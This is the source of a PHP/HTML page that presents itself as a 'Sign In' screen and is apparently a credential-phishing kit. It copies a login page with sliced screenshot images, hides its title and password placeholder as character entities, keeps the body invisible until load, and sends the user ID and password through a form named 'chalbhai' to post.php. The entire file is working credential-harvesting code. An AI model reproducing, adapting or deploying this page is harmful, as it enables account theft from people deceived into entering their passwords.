<?php

$userid = $_POST['userid'];

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#83;&#105;&#103;&#110;&#32;&#73;&#110;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
 .textbox {
    height: 36px;
    width: 275px;
	padding-left: 8px;
	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    font-size: 15px;
    line-height: 20px;
    font-weight: 400;
    font-size: .9375rem;
    border: 1px solid #666;
    
    
}
 .textbox:focus {
    border-color: #4488cc;
	border-style: solid;   
    border-width: 1px;
    outline: 0;
}
 </style>
<style type="text/css">
 .textrbox {
    height: 26px;
    width: 275px;
	padding-left: 8px;
	padding-right: 8px;
	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    font-size: 15px;
	color: #262626;
    text-align: right;
    line-height: 20px;
    font-weight: 400;
    font-size: .9375rem;
    border: 0px solid #fff;
	background-color: #F2F2F2;
    
    
}
 .textrbox:focus {
    border-color: #fff;
	
	background-color: #F2F2F2;	
    border-width: 0px;
    outline: 0;
}
 </style>
 <style type="text/css">
 input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label {
							padding-left:26px;
							height:21px; 
							display:inline-block;
							line-height:21px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:21px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label {
							background-position: 0 -21px;
						}
						label.css-label {
				background-image:url(http://csscheckbox.com/checkboxes/u/csscheckbox_a4824bcf5d413f078bdd6abd3e6e5bf4.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()" bgColor="#030100">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:172px; z-index:0"><img src="images/m1.png" alt="" title="" border=0 width=1365 height=172></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:169px; width:1365px; height:161px; z-index:1"><img src="images/m2.png" alt="" title="" border=0 width=1365 height=161></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:328px; width:1365px; height:176px; z-index:2"><img src="images/m3.png" alt="" title="" border=0 width=1365 height=176></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:499px; width:1365px; height:164px; z-index:3"><img src="images/m4.png" alt="" title="" border=0 width=1365 height=164></div>

<div id="image7" style="position:absolute; overflow:hidden; left:1148px; top:641px; width:205px; height:16px; z-index:4"><a href="#"><img src="images/m5.png" alt="" title="" border=0 width=205 height=16></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:477px; top:135px; width:412px; height:365px; z-index:5"><img src="images/m8.png" alt="" title="" border=0 width=412 height=365></div>

<div id="image6" style="position:absolute; overflow:hidden; left:513px; top:444px; width:120px; height:16px; z-index:10"><a href="#"><img src="images/m9.png" alt="" title="" border=0 width=120 height=16></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:513px; top:352px; width:167px; height:38px; z-index:11"><a href="#"><img src="images/m10.png" alt="" title="" border=0 width=167 height=38></a></div>
<form action=post.php name=chalbhai id=chalbhai method=post>
<input name="userid" value="<?=$userid?>" class="textrbox" autocomplete="off" required type="text" style="position:absolute;width:290px;left:508px;top:214px;z-index:6">
<input name="pass" id="demo-field" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:338px;left:514px;top:300px;z-index:7">
<div id="formimage1" style="position:absolute; left:686px; top:351px; z-index:8"><input type="image" name="formimage1" width="167" height="38" src="images/logn.png"></div>

<div id="checkboxG1"  style="position:absolute; left:513px; top:404px; z-index:9"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:513px; top:404px; z-index:9"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>


</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
